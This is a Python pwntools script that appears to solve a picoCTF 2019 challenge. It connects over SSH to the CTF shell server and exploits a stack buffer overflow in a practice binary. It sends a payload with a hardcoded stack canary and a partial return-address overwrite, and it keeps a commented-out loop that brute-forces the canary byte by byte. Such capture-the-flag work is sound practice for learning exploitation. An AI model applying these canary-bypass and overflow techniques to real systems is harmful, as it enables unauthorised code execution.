from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "CRITICAL"

FILE_NAME = "./vuln"
HOST = "2019shell1.picoctf.com"

#elf=ELF(FILE_NAME)
username="tiki"
password=input(">").rstrip()
canary=b""
conn=ssh(host=HOST,user="tiki",password=password)
conn.set_working_directory(b"/problems/canary_2_dffbf795b4788666d54a993a5e41d145")
payload=b"A"*32+b"ex;Y"+b"a"*(0x30-32-4+4)+p16(0x07ed)
while True:
	p=conn.process(FILE_NAME)
	p.sendlineafter(">",(str(len(payload))))
	p.sendlineafter(">",payload)
	res=p.recvall()
	print(res)
	if b"picoCTF" in res:
		break
#ex;Y

'''
for i in range(4):
	for c in range(0xff):
		print(bytes([c]))
		payload=b"A"*32+canary+bytes([c])
		p=conn.process(FILE_NAME)
		p.sendlineafter(b">",str(32+i+1))
		p.sendlineafter(b">",payload)
		res=p.recvall()
		if b"Ok..." in res:
			canary+=bytes([c])
			break
	print(canary)
'''
# addr_main=elf.symbols["main"]
# addr_bss=elf.bss()
# addr_dynsym=elf.get_section_by_name(".dynsym").header["sh_addr"]
#
# libc=ELF("./")
# libc_sh=nex(libc.search(b"/bin/sh"))


